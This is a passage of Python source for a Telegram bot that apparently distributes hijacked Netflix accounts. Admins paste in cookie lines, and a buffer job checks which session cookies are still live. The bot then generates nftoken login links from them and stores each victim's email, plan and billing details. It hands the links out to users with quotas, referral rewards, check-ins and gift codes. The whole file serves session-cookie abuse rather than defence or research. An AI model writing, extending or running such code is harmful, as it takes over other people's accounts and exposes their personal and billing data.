            await msg.reply_text(t("addcode_bad_claims", lang))
            return

    ok, err_msg, ncode = create_gift_code(code, uses, created_by=user.id, max_claims=claims)
    if not ok:
        await msg.reply_text(t("addcode_fail", lang, err=escape(str(err_msg))))
        return

    await msg.reply_text(
        t("addcode_done", lang, code=ncode, uses=uses, claims=claims),
        parse_mode=ParseMode.HTML,
    )


# ═══════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════
#  /loginlink command -- Generate login link from active session
# ═══════════════════════════════════════════════════════════════════

async def cmd_loginlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    lang = get_user_lang(user.id) or "vi"
    user_limit = DAILY_LIMIT

    # Check remaining uses
    uses_left_val = get_uses_left(user.id)
    if uses_left_val <= 0:
        await msg.reply_text(
            t("no_uses_left", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    searching_msg = await msg.reply_text(
        t("searching", lang),
        parse_mode=ParseMode.HTML,
    )

    loop = asyncio.get_event_loop()
    link, error, payload = await loop.run_in_executor(
        _executor, _find_and_generate_login_link, user.id, lang
    )

    if link:
        # Consume use
        bonus = 0
        if consume_use(user.id, 1):
            use_res = record_use(user.id, username=user.username, first_name=user.first_name)
            bonus = int((use_res or {}).get("bonus") or 0)

        user_info = f"@{user.username}" if user.username else user.first_name or str(user.id)
        logger.info(f"🔗 LOGIN LINK GIVEN to {user_info} (ID: {user.id})")

        await searching_msg.edit_text(
            _build_loginlink_message(link, payload, user.id, lang, bonus),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=result_keyboard(lang),
        )

        # Save active session for later re-check
        if payload:
            payload["mode"] = "loginlink"
            session_id = _save_active_session(user.id, lang, payload)
            if context.job_queue:
                _schedule_feedback_prompt(context.job_queue, user.id, lang, session_id)

    else:
        logger.warning(f"[cmd_loginlink] Login link failed for user {user.id}: {error}")
        await searching_msg.edit_text(
            t("link_fail", lang),
            parse_mode=ParseMode.HTML,
            reply_markup=result_keyboard(lang),
        )



# ═══════════════════════════════════════════════════════════════════
#  Text input handler
# ═══════════════════════════════════════════════════════════════════

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.effective_message
    if not msg or not msg.text:
        return

    if bool(context.user_data.get("await_cookie_file")):
        context.user_data["await_cookie_file"] = False
        user = update.effective_user
        if not user or user.id not in ADMIN_IDS:
            return
        lang = get_user_lang(user.id) or "vi"
        parsed = parse_netflix_data(msg.text)
        counts = _process_cookie_lines(parsed["cookie_lines"])
        total_parsed = len(msg.text.splitlines())
        report = _cookie_report_html(total_parsed, parsed["expired_count"], counts, lang)
        if counts["added"] == 0 and counts["duplicate"] == 0 and parsed["expired_count"] == 0:
            report += t("cookie_report_empty", lang)
        await msg.reply_text(report)
        return

    if bool(context.user_data.get("await_redeem_code")):
        context.user_data["await_redeem_code"] = False
        lang = get_user_lang(update.effective_user.id) or "vi"
        await msg.reply_text(t("redeem_removed", lang))
        return


# ═══════════════════════════════════════════════════════════════════
#  /ref command
# ═══════════════════════════════════════════════════════════════════

async def cmd_ref(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    ref_link = f"https://t.me/{BOT_USERNAME.lstrip('@')}?start=ref_{user.id}"
    ref_today = get_ref_today(user.id)
    ref_bonus = get_ref_bonus(user.id)
    total_limit = get_user_daily_limit(user.id)

    await msg.reply_text(
        t("ref_info", lang,
          ref_link=ref_link,
          ref_today=ref_today, ref_bonus=ref_bonus,
          total_limit=total_limit,
          max_ref=REF_DAILY_CAP,
          bonus_per_ref=REF_BONUS_PER_REF,
          max_bonus=REF_DAILY_CAP * REF_BONUS_PER_REF,
          base_limit=DAILY_LIMIT),
        parse_mode=ParseMode.HTML,
    )


# ═══════════════════════════════════════════════════════════════════
#  Check-in (điểm danh) — dùng chung cho nút menu và lệnh /checkin
# ═══════════════════════════════════════════════════════════════════

def _checkin_result_text(lang: str, user_id: int) -> str:
    """Chạy do_checkin và trả text phản hồi (thành công / nổ mốc / đã điểm danh)."""
    res = do_checkin(user_id)
    if res.get("ok"):
        milestone_text = ""
        if res.get("milestone"):
            milestone_text = t("checkin_milestone", lang,
                               milestone_days=CHECKIN_MILESTONE_DAYS,
                               milestone_bonus=CHECKIN_MILESTONE_BONUS)
        return t("checkin_done", lang,
                 bonus=res.get("bonus", 1), streak=res.get("streak", 1),
                 milestone_text=milestone_text,
                 milestone_days=CHECKIN_MILESTONE_DAYS)
    return t("checkin_already", lang, streak=res.get("streak", 0))


async def cmd_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"

    # Trong nhóm: điểm danh ngay, reply hiện cho cả nhóm thấy (mọi người bắt chước theo)
    if msg.chat.type in ("group", "supergroup"):
        await msg.reply_text(
            _checkin_result_text(lang, user.id),
            parse_mode=ParseMode.HTML,
        )
        return

    # DM: giữ gate nhóm như nút điểm danh
    missing = await check_user_in_group(context.bot, user.id)
    if missing:
        sent = await msg.reply_text(
            _join_required_text(lang, missing),
            parse_mode=ParseMode.HTML,
            reply_markup=join_group_keyboard(lang, missing),
            disable_web_page_preview=True,
        )
        _track_join_prompt(user.id, sent.chat_id, sent.message_id)
        return

    await msg.reply_text(
        _checkin_result_text(lang, user.id),
        parse_mode=ParseMode.HTML,
    )


# ═══════════════════════════════════════════════════════════════════
#  Admin: /msg -- Broadcast message to all users
# ═══════════════════════════════════════════════════════════════════

async def cmd_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return

    if not context.args:
        await msg.reply_text(
            t("msg_usage", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    content = " ".join(context.args)
    all_uids = get_all_user_ids()
    if not all_uids:
        await msg.reply_text(t("no_users", lang))
        return

    await msg.reply_text(
        t("msg_sending", lang, count=len(all_uids)),
    )

    sent = 0
    failed = 0
    for uid in all_uids:
        try:
            u_lang = get_user_lang(uid) or "vi"
            broadcast_text = t("broadcast_header", u_lang, content=content)
            await context.bot.send_message(
                chat_id=uid,
                text=broadcast_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            sent += 1
        except Exception:
            failed += 1
        # Tránh bị rate limit bởi Telegram
        await asyncio.sleep(0.05)

    await msg.reply_text(
        t("msg_done", lang, sent=sent, total=len(all_uids), failed=failed),
    )

# ═══════════════════════════════════════════════════════════════════
#  /help -- Hướng dẫn khắc phục lỗi login
# ═══════════════════════════════════════════════════════════════════

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"

    missing = await check_user_in_group(context.bot, user.id)
    if missing:
        await msg.reply_text(
            _join_required_text(lang, missing),
            parse_mode=ParseMode.HTML,
            reply_markup=join_group_keyboard(lang),
            disable_web_page_preview=True,
        )
        return

    await msg.reply_text(
        t("help", lang),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=back_keyboard(lang),
    )


# ═══════════════════════════════════════════════════════════════════
#  Buffer refill job — tự gen + validate link trước, nạp vào buffer
# ═══════════════════════════════════════════════════════════════════

def _fill_buffer_once():
    """Gen tối đa 5 link đã validate rồi nạp buffer (chạy trong _executor)."""
    from checker import parse_cookie_line, check_cookie, generate_nftoken, validate_nftoken

    stats = get_link_buffer_stats()
    if stats["validated"] >= 10:
        return

    max_attempts = 12
    success = 0
    attempts = 0
    idle_waits = 0
    used_this_run = set()
    buffered_idx = get_buffer_source_indices()

    while success < 5 and attempts < max_attempts:
        # Ưu tiên không trùng cookie đã có trong buffer; pool nhỏ thì chấp nhận lặp
        idx = get_random_index(exclude=used_this_run | buffered_idx)
        if idx is None and buffered_idx:
            idx = get_random_index(exclude=used_this_run)
        if idx is None:
            idle_waits += 1
            if idle_waits > 10:
                break
            time.sleep(0.05)
            continue
        idle_waits = 0
        used_this_run.add(idx)

        raw = get_cookie_line(idx)
        if not raw:
            release_index(idx)
            continue

        attempts += 1
        logger.info(f"[Buffer] Trying cookie #{idx + 1}... (attempt {attempts}/{max_attempts})")

        netflix_id, secure_id, extras = parse_cookie_line(raw)
        if not netflix_id:
            release_index(idx)
            continue

        info = check_cookie(netflix_id, secure_id)

        if info.get("status") == "DEAD":
            _cookie_dead_policy(idx, info, raw)
            continue
        if info.get("status") == "ERROR":
            release_index(idx)
            time.sleep(1)
            continue
        if str(info.get("membershipStatus", "")).upper() == "FORMER_MEMBER":
            _cookie_dead_policy(idx, info, raw)
            continue

        cookie_dict = {"NetflixId": netflix_id}
        if secure_id:
            cookie_dict["SecureNetflixId"] = secure_id
        cookie_dict.update(extras)
        cookie_dict.update(info.get("_cookies") or {})

        token, error = generate_nftoken(cookie_dict)
        release_index(idx)

        if not token:
            logger.info(f"[Buffer] Cookie #{idx + 1} nftoken failed: {error}")
            if error and "access denied" in str(error).lower():
                mark_nftoken_blocked(idx)
            continue

        login_link = f"https://www.netflix.com/login?nftoken={quote(token, safe='')}"
        v = validate_nftoken(token)
        if v is False:
            mark_nftoken_blocked(idx)
            logger.info(f"[Buffer] Cookie #{idx + 1} token rejected - isolated")
            continue
        if v is True:
            mark_nftoken_good(idx)
        payload = {
            "netflix_id": netflix_id,
            "secure_id": secure_id,
            "cookie_dict": cookie_dict,
            "plan": info.get("plan") or "-",
            "email": info.get("email") or "-",
            "billing": info.get("billing") or "-",
            "source_index": idx,
            "raw_cookie": raw,
        }
        push_link_buffer(login_link, payload, validated=(v is True))
        success += 1
        logger.info(f"[Buffer] Link #+{success} pushed to buffer (validation={v})")


async def buffer_refill_job(context: ContextTypes.DEFAULT_TYPE):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(_executor, _fill_buffer_once)


# ═══════════════════════════════════════════════════════════════════
#  Error handler
# ═══════════════════════════════════════════════════════════════════

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling update:", exc_info=context.error)
